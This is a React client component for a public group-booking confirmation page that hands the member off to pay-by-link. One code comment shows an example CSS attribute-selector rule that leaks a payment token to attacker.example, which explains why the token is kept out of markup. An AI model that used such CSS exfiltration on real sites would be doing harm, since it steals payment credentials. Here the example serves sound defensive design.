"use client";

import { useState } from "react";
import { AlertTriangle, CheckCircle2, Clock } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import type { ClubIdentity } from "@/config/club-identity-types";
import {
  calendarDateOfDateOnlyInstant,
  formatClubDate,
  parseInstant,
} from "@/lib/club-time";
import { formatCents } from "@/lib/utils";

/**
 * One night of the stay, rendered as the CALENDAR DAY it is (CT-4, #2870).
 *
 * `checkIn`/`checkOut` arrive over `fetch` as serialised `@db.Date` lodge
 * nights, which are calendar days and take no timezone at all: the kernel
 * decodes the UTC-midnight encoding back to the day it encodes and formats it
 * pinned to `UTC`, so the projection is provably the identity for every club.
 * The old `formatNZDate(new Date(value))` projected it through `APP_TIME_ZONE`,
 * which cancels only because New Zealand is east of Greenwich; a club west of it
 * showed the night BEFORE the stay on a page a member reaches from an email.
 *
 * `parseInstant` rather than a bare `new Date`, and the raw value rather than a
 * throw, because nothing validates this payload on the way in and this is a
 * public token landing page: an unhandled throw in a client render replaces the
 * whole screen with an error boundary. THE PREVIOUS CODE THREW TOO —
 * `Intl.DateTimeFormat.format` on an invalid `Date` is a `RangeError`, not the
 * string "Invalid Date", which only `toLocaleDateString` produces — so this
 * fallback is a FIX rather than a preserved behaviour.
 */
function formatStayDay(value: string): string {
  // NOT-A-STRING FIRST, and this order is the whole point: `parseInstant` calls
  // `value.trim()` BEFORE its own nullish check, so `parseInstant(null)` throws a
  // `TypeError` out of the guard that exists to stop a throw. The premise above
  // is that nothing validates this payload on the way in, and a missing field is
  // exactly what an unvalidated payload produces — so the guard has to cover it.
  if (typeof value !== "string") return "";
  const instant = parseInstant(value);
  if (instant === null) return value;
  try {
    return formatClubDate(calendarDateOfDateOnlyInstant(instant));
  } catch {
    return value;
  }
}

type Outcome =
  | "idle"
  | "submitting"
  | "created"
  | "already_done"
  | "invalid"
  | "expired"
  | "not_joinable"
  | "capacity_full"
  // #2363: the lodge's minimum-stay rules no longer allow this group's dates.
  | "minimum_stay"
  // #2569: the lodge requires an adult member to cover non-member guests, and
  // this sign-up has nobody on it who can.
  | "adult_member_hosting"
  | "error";

interface CreatedDetails {
  payToken?: string;
  priceCents?: number;
  checkIn?: string;
  checkOut?: string;
  guestCount?: number;
}

export function GroupJoinVerifyPageClient({
  club,
  token,
  lodgeName = null,
}: {
  club: ClubIdentity;
  token: string;
  /**
   * The lodge this group is actually staying at (#2919), resolved server-side
   * from the token. Null when the token is unknown or malformed, which reads as
   * the club's default lodge — the same wording the page has always shown, so
   * the copy never becomes a "does this token exist?" oracle.
   */
  lodgeName?: string | null;
}) {
  const [outcome, setOutcome] = useState<Outcome>("idle");
  const [details, setDetails] = useState<CreatedDetails>({});
  const [message, setMessage] = useState<string>("");

  /**
   * Hand off to the pay-by-link page.
   *
   * The token is taken as an ARGUMENT and used only inside this function, which
   * runs in the browser and writes nothing into the document. That is the whole
   * security property of #2827: `payToken` is a BEARER CREDENTIAL for
   * `/pay/[token]`, so it may live in component state and in a navigation, but it
   * must never be rendered into markup.
   *
   * This page is public and carries the club's normal chrome, which includes the
   * admin-authored Raw CSS from Site Appearance. CSS attribute selectors read a
   * value one character at a time:
   *
   *     a[href^="/pay/9f3a"] { background: url(https://attacker.example/9f3a); }
   *
   * so the `<a href={`/pay/${payToken}`}>` this replaces turned the recovery link
   * into a payment-token oracle for anyone who can edit the site's styling. A
   * content/styling administrator is deliberately NOT inside the payment-token
   * trust boundary, so the control is to keep the credential out of rendered,
   * selectable page data rather than to take Raw CSS or club styling away.
   */
  function goToPayment(payToken: string) {
    window.location.href = `/pay/${encodeURIComponent(payToken)}`;
  }

  async function confirm() {
    setOutcome("submitting");
    setMessage("");
    try {
      const res = await fetch(
        `/api/group-bookings/join/verify/${encodeURIComponent(token)}`,
        { method: "POST" }
      );
      const data = await res.json().catch(() => ({}));

      if (res.status === 404) return setOutcome("invalid");
      if (res.status === 410) return setOutcome("expired");
      if (res.status === 409) {
        setMessage(data.message || "");
        if (data.outcome === "capacity_full") return setOutcome("capacity_full");
        // #2363: minimum stay is its own 409 outcome — the group's dates no
        // longer satisfy the lodge's rules, which is not the same story as a
        // group that stopped accepting joins.
        if (data.outcome === "minimum_stay") return setOutcome("minimum_stay");
        // #2569: its own outcome for the same reason — "this lodge needs an adult
        // member with you" is a different story from "this group stopped
        // accepting joins", and it tells the joiner who can fix it.
        if (data.outcome === "adult_member_hosting") {
          return setOutcome("adult_member_hosting");
        }
        return setOutcome("not_joinable");
      }
      if (!res.ok) return setOutcome("error");

      if (data.outcome === "already_done") {
        return setOutcome("already_done");
      }
      if (data.outcome === "created") {
        setDetails({
          payToken: data.payToken,
          priceCents: data.priceCents,
          checkIn: data.checkIn,
          checkOut: data.checkOut,
          guestCount: data.guestCount,
        });
        setOutcome("created");
        // Hand straight off to the existing pay-by-link page.
        if (data.payToken) {
          goToPayment(data.payToken);
        }
        return;
      }
      setOutcome("error");
    } catch {
      setOutcome("error");
    }
  }

  // Read into a const so the recovery control's click handler can close over a
  // NARROWED value. `details.payToken` is optional, and TypeScript does not carry
  // a narrowing on a mutable property into a callback, so the alternative would
  // be a non-null assertion on the very value this issue is about.
  const payToken = details.payToken;

  return (
    <div className="mx-auto flex min-h-[60vh] max-w-lg items-center justify-center p-4">
      <Card className="w-full">
        <CardHeader>
          <CardTitle>Confirm your group booking spot</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          {outcome === "idle" || outcome === "submitting" ? (
            <>
              <p className="text-sm text-muted-foreground">
                Confirm your email to finalise your spot at{" "}
                {lodgeName ?? club.lodgeName}. We&apos;ll
                then take you to a secure page to pay for your stay.
              </p>
              <Button onClick={confirm} disabled={outcome === "submitting"}>
                {outcome === "submitting" ? "Confirming..." : "Confirm and continue to payment"}
              </Button>
            </>
          ) : null}

          {outcome === "created" ? (
            <div className="space-y-3">
              <div className="flex items-center gap-2 text-success-11">
                <CheckCircle2 className="h-6 w-6 shrink-0" />
                <p className="font-medium">Your spot is reserved — taking you to payment...</p>
              </div>
              {details.checkIn && details.checkOut ? (
                <div className="rounded-md border bg-card p-3 text-sm text-muted-foreground">
                  <p>
                    Dates: {formatStayDay(details.checkIn)} to{" "}
                    {formatStayDay(details.checkOut)}
                  </p>
                  {typeof details.guestCount === "number" ? (
                    <p className="mt-1">Guests: {details.guestCount}</p>
                  ) : null}
                  {typeof details.priceCents === "number" ? (
                    <p className="mt-1 font-semibold text-foreground">
                      Amount due: {formatCents(details.priceCents)}
                    </p>
                  ) : null}
                </div>
              ) : null}
              {payToken ? (
                <p className="text-sm text-muted-foreground">
                  If you are not redirected,{" "}
                  {/*
                    A button, not a link, and deliberately so (#2827). It looks and
                    reads like the link it replaces, but the destination lives in
                    JavaScript state instead of an `href`, so there is no rendered
                    attribute for admin Raw CSS to select on. See `goToPayment`.

                    No no-JavaScript path is lost by this: reaching this state at
                    all requires the Confirm button's `fetch`, and only that
                    response carries the token.
                  */}
                  <Button
                    type="button"
                    variant="link"
                    className="h-auto p-0 align-baseline text-sm underline"
                    onClick={() => goToPayment(payToken)}
                  >
                    continue to payment
                  </Button>
                  .
                </p>
              ) : null}
            </div>
          ) : null}

          {outcome === "already_done" ? (
            <div className="flex items-start gap-2 text-success-11">
              <CheckCircle2 className="h-6 w-6 shrink-0" />
              <p className="font-medium">
                You&apos;re already confirmed for this group booking. Check your email for the
                payment link.
              </p>
            </div>
          ) : null}

          {outcome === "expired" ? (
            <div className="space-y-2">
              <div className="flex items-center gap-2 text-warning-11">
                <Clock className="h-6 w-6 shrink-0" />
                <p className="font-medium">This confirmation link has expired.</p>
              </div>
              <p className="text-sm text-muted-foreground">
                Confirmation links are valid for 48 hours. Ask the organiser for a fresh link, or
                submit a new request to join.
              </p>
            </div>
          ) : null}

          {outcome === "capacity_full" ? (
            <div className="flex items-start gap-2 text-warning-11">
              <AlertTriangle className="h-6 w-6 shrink-0" />
              <p className="font-medium">
                The lodge has filled up for these dates, so this spot is no longer available.
              </p>
            </div>
          ) : null}

          {outcome === "minimum_stay" ? (
            <div className="space-y-2">
              <div className="flex items-start gap-2 text-warning-11">
                <AlertTriangle className="h-6 w-6 shrink-0" />
                <p className="font-medium">
                  This group&apos;s stay is shorter than the minimum stay
                  required for those nights, so we can&apos;t confirm your spot.
                </p>
              </div>
              {/*
                No echo of the server's `message` here, unlike the not_joinable
                branch below. This outcome writes its own full copy, and the
                server's sentence for it is deliberately generic (#2363) — it
                would only restate the heading. The detail that WOULD add
                something, the rule and its night count, is intentionally never
                sent to this unauthenticated page.
              */}
              <p className="text-sm text-muted-foreground">
                Please contact the organiser — the rules for these dates changed
                after you asked to join. Nothing has been booked and you
                haven&apos;t been charged.
              </p>
            </div>
          ) : null}

          {outcome === "adult_member_hosting" ? (
            <div className="space-y-2">
              <div className="flex items-start gap-2 text-warning-11">
                <AlertTriangle className="h-6 w-6 shrink-0" />
                <p className="font-medium">
                  This lodge asks that non-member guests are covered by an adult
                  member for every night they stay, so we can&apos;t confirm your
                  spot on its own.
                </p>
              </div>
              {/*
                Its own copy, and no echo of the server's `message`, for the same
                reason the minimum-stay branch above writes its own: the server's
                sentence is deliberately generic on this unauthenticated page
                (#2569 §5), and the detail that would add something — which nights
                are uncovered, and which kinds of adult member the club counts — is
                never sent here.

                The organiser is named as the way out rather than the exception
                door: asking a Booking Officer needs a member account, which a
                non-member joiner does not have.
              */}
              <p className="text-sm text-muted-foreground">
                Please contact the organiser — they can add cover for these
                nights or ask a Booking Officer to approve it. Nothing has been
                booked and you haven&apos;t been charged.
              </p>
            </div>
          ) : null}

          {outcome === "not_joinable" ? (
            <div className="flex items-start gap-2 text-warning-11">
              <AlertTriangle className="h-6 w-6 shrink-0" />
              <p className="font-medium">
                {message || "This group is no longer accepting joins."}
              </p>
            </div>
          ) : null}

          {outcome === "invalid" || outcome === "error" ? (
            <div className="space-y-2">
              <div className="flex items-center gap-2 text-warning-11">
                <AlertTriangle className="h-6 w-6 shrink-0" />
                <p className="font-medium">This confirmation link is not valid.</p>
              </div>
              <p className="text-sm text-muted-foreground">
                Please check you used the most recent link from your email, or contact{" "}
                {club.name} for help.
              </p>
            </div>
          ) : null}
        </CardContent>
      </Card>
    </div>
  );
}
